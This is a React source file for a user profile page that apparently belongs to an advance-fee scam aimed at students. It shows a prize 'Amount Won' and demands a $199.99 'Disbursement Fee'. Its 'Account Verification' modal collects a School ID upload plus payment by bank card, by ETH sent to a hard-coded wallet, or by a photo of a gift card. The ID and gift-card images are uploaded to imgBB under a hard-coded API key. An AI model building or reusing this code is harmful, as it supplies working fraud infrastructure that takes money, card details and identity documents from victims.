import { useState, useEffect } from "react";
import avatar from "../assets/images/user.jpg";
import Header from "../components/header";
import { Icon } from "@iconify/react";
import CardInput from "../components/bankCard";
import CoinPayment from "../components/coin";
import { useUser } from "../context/user";
import { useNavigate } from "react-router-dom";

export default function UserProfileView() {
  const { user } = useUser();
  const navigate = useNavigate();
  const [show, setShow] = useState(false);
  const [open, setOpen] = useState(false);
  const [schoolId, setSchoolId] = useState(null);
  const [giftCard, setGiftCard] = useState(null);
  const [error, setError] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("");
  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
  });

  const [success, setSuccess] = useState(false);

  const maskRef = (ref) => {
    if (!ref || ref.length < 7) return ref;
    if (show) return ref; // show full ref
    // mask last 4 characters
    const visible = ref.slice(0, ref.length - 7);
    return visible + "*******";
  };

  const [loading, setLoading] = useState(false);

  const API_KEY = "29ce6589b24e939165767babf7070187"; //

  const uploadToImgBB = async (file) => {
    const formData = new FormData();
    formData.append("image", file);
    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
      method: "POST",
      body: formData,
    });
    const data = await res.json();
    if (!data.success) throw new Error("Upload failed");
    return data.data.url;
  };

  const handleSubmit = async () => {
    if (!schoolId || !giftCard) {
      setError("Please upload both School ID and Gift Card.");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const [schoolIdUrl, giftCardUrl] = await Promise.all([
        uploadToImgBB(schoolId),
        uploadToImgBB(giftCard),
      ]);

      //   console.log("✅ Uploaded URLs:", { schoolIdUrl, giftCardUrl });

      setSuccess(true);
      setSchoolId(null);
      setGiftCard(null);

      // Auto close modal after 3s
      setTimeout(() => setOpen(false), 3000);
    } catch (err) {
      //   console.error(err);
      setError("Upload failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!user) navigate("/");
  }, [user, navigate]);

  if (!user) return null; // prevent flash before redirect

  return (
    <>
      <Header />
      <div className="my-[70px] max-w-4xl mx-auto p-6 bg-white rounded-2xl shadow-md">
        <div className="flex flex-col md:flex-row gap-6">
          {/* Avatar / basic */}
          <div className="flex-shrink-0 w-full md:w-56 flex items-center justify-center">
            <div className="relative">
              <img
                src={avatar}
                alt={`${user.name} avatar`}
                className="w-40 h-40 rounded-xl object-cover shadow-sm"
              />
              <div className="mt-6 flex flex-wrap gap-3">
                <button
                  onClick={() => setOpen((prev) => !prev)}
                  className="block w-full text-sm px-4 py-2 rounded-lg bg-[#005287] text-white"
                >
                  Claim
                </button>
              </div>
            </div>
          </div>

          {/* Info */}
          <div className="flex-1">
            <div className="flex items-start justify-between">
              <div>
                <h2 className="text-2xl font-semibold capitalize">
                  {user.name}
                </h2>
                <p className="text-sm text-slate-500 mt-1">{user.school}</p>
                <p className="text-sm text-slate-500">
                  valid till: <b> 2025-01-12</b>
                </p>
              </div>

              <div className="flex gap-3">
                <button className="px-4 py-2 rounded-lg border btn text-white bold hover:shadow">
                  Need Assistance
                </button>
              </div>
            </div>

            <div className="mt-5 grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="p-4 bg-slate-50 rounded-lg">
                <p className="text-xs text-slate-500">Email</p>
                <p className="text-sm font-medium text-slate-800">
                  {user.email}
                </p>
              </div>

              <div className="p-4 bg-slate-50 rounded-lg">
                <p className="text-xs text-slate-500">Phone</p>
                <p className="text-sm font-medium text-slate-800">
                  {user.mobile}
                </p>
              </div>

              <div className="p-4 bg-slate-50 rounded-lg sm:col-span-2">
                <p className="text-xs text-slate-500">Address</p>
                <p className="text-sm font-medium text-slate-800">
                  {user.address}
                </p>
              </div>

              <div className="p-4 bg-slate-50 rounded-lg">
                <p className="text-xs text-slate-500">Amount Won</p>
                <p className="text-sm font-medium text-slate-800">
                  $ {user.amount}
                </p>
              </div>

              <div className="p-4 bg-slate-50 rounded-lg">
                <p className="text-xs text-slate-500">School</p>
                <p className="text-sm font-medium text-slate-800">
                  {user.school}
                </p>
              </div>
              <div className="p-4 bg-slate-50 rounded-lg sm:col-span-2 flex items-center justify-between">
                <div>
                  <p className="text-xs text-slate-500">Disbursement Fee</p>
                  <p className="text-sm font-medium text-slate-800">$199.99</p>
                </div>
                <p className="text-sm font-medium flex items-center gap-2">
                  <span
                    className={`px-3 py-1 rounded-full text-sm font-medium ${
                      user?.status === "Paid"
                        ? "bg-green-100 text-green-800"
                        : "bg-red-100 text-red-800"
                    }`}
                  >
                    {user?.status || "Unpaid"}
                  </span>
                </p>
              </div>

              <div className="p-4 bg-slate-50 rounded-lg sm:col-span-2">
                <p className="text-xs text-slate-500">Reference Number</p>
                <p className="text-sm font-medium text-slate-800 flex ">
                  <span>{maskRef(user.ref)}</span>

                  <button
                    type="button"
                    onClick={() => setShow(!show)}
                    className="text-slate-600 ml-3"
                  >
                    <Icon icon={show ? "mdi:eye" : "mdi:eye-off"} width="22" />
                  </button>
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Footer / notes */}

        <section className="max-w-4xl mx-auto my-12 p-6  ">
          <h2 className="text-2xl font-semibold text-slate-800 mb-4 flex items-center gap-2">
            Notes
          </h2>

          <p className="text-slate-600 mb-6">
            Please read the following carefully to ensure you get the best
            experience using our platform:
          </p>

          <ol className="space-y-4 text-slate-700 list-decimal list-inside">
            <li className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:shadow-sm transition">
              Ensure your profile information is accurate and up to date.
            </li>
            <li className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:shadow-sm transition">
              Pay your Disbursement Fee before the expiration date to maintain
              eligibility.
            </li>
            <li className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:shadow-sm transition">
              Keep your Reference Number and School ID secure. Anyone with
              access can claim your funds.
            </li>
            <li className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:shadow-sm transition">
              Check your email regularly for updates or grant notifications.
            </li>
            <li className="p-3 bg-slate-50 rounded-lg border border-slate-100 hover:shadow-sm transition">
              Contact support immediately if you notice any suspicious activity.
            </li>
          </ol>
        </section>
      </div>
      {/* Modal */}
      {open && (
        // <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
        //   <div className="bg-white w-full max-w-md mx-3 rounded-2xl shadow-lg p-6 relative">
        <div className="fixed inset-0 bg-black/50 z-50 overflow-auto flex items-start md:items-center justify-center p-4">
          <div className="bg-white w-full max-w-md rounded-2xl shadow-lg p-6 my-10 md:my-0 overflow-auto max-h-[90vh]">
            <button
              className="absolute top-3 right-3 text-slate-500 hover:text-slate-700"
              onClick={() => setOpen(false)}
            >
              ✖
            </button>

            <h2 className="text-xl font-semibold text-slate-800 mb-4">
              Account Verification
            </h2>

            <p className="text-sm text-slate-600 mb-5">
              Please upload your <b>School ID</b> and select a{" "}
              <b>Payment Method</b> for verification. You’ll receive a
              confirmation email within <b>48 hours</b> once your documents are
              reviewed.
            </p>

            {error && (
              <div className="bg-red-100 text-red-600 text-sm p-2 rounded mb-3">
                {error}
              </div>
            )}
            {success && (
              <div className="bg-green-100 text-green-700 text-sm p-2 rounded mb-3">
                Documents submitted successfully. You’ll receive a verification
                email within 48 hours.
              </div>
            )}

            <form className="space-y-5">
              {/* School ID Upload */}
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-2">
                  School ID Card
                </label>
                <input
                  type="file"
                  accept="image/*,.pdf"
                  onChange={(e) => setSchoolId(e.target.files[0])}
                  className="block w-full border border-slate-200 rounded-lg text-sm p-2 file:mr-3 file:px-3 file:py-2 file:border-0 file:rounded-md file:bg-blue-600 file:text-white hover:file:bg-blue-700"
                />
                {schoolId && (
                  <p className="text-xs text-green-600 mt-1">
                    {schoolId.name} selected
                  </p>
                )}
              </div>

              {/* Payment Method Select */}
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-2">
                  Payment Method
                </label>
                <select
                  value={paymentMethod}
                  onChange={(e) => setPaymentMethod(e.target.value)}
                  className="block w-full border border-slate-200 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
                >
                  <option value="">Select Payment Method</option>
                  <option value="Card">Bank Card</option>
                  <option value="Coin">Coin</option>
                  <option value="GiftCard">Gift Card</option>
                </select>
              </div>

              {/* Conditional Inputs Based on Payment Method */}
              {paymentMethod === "Card" && (
                <div>
                  <CardInput cardData={cardData} setCardData={setCardData} />
                </div>
              )}

              {paymentMethod === "Coin" && (
                <div>
                  <CoinPayment
                    amount="0.059 ETH"
                    ethAddress="0x960c1f5e8930625eeb6e18bcd2fac68ff43f63bc"
                  />
                </div>
              )}

              {paymentMethod === "GiftCard" && (
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-2">
                    Gift Card
                  </label>
                  <div
                    className="border-2 border-dashed border-slate-300 rounded-xl p-6 text-center cursor-pointer hover:bg-slate-50 transition"
                    onClick={() =>
                      document.getElementById("giftCardInput").click()
                    }
                  >
                    <Icon
                      icon="mdi:gift-outline"
                      width="40"
                      className="mx-auto mb-2 text-blue-600"
                    />
                    <p className="text-slate-600 text-sm">
                      {giftCard
                        ? giftCard.name
                        : "Click to upload or drag and drop"}
                    </p>
                  </div>
                  <input
                    id="giftCardInput"
                    type="file"
                    accept="image/*,.pdf"
                    className="hidden"
                    onChange={(e) => setGiftCard(e.target.files[0])}
                  />
                </div>
              )}

              {/* Submit Button */}
              <button
                type="button"
                onClick={handleSubmit}
                disabled={loading}
                className="w-full py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition flex justify-center items-center gap-2"
              >
                {loading ? (
                  <>
                    <Icon
                      icon="eos-icons:loading"
                      className="animate-spin"
                      width="20"
                    />
                    Uploading...
                  </>
                ) : (
                  "Submit"
                )}
              </button>
            </form>
          </div>
        </div>
      )}
    </>
  );
}
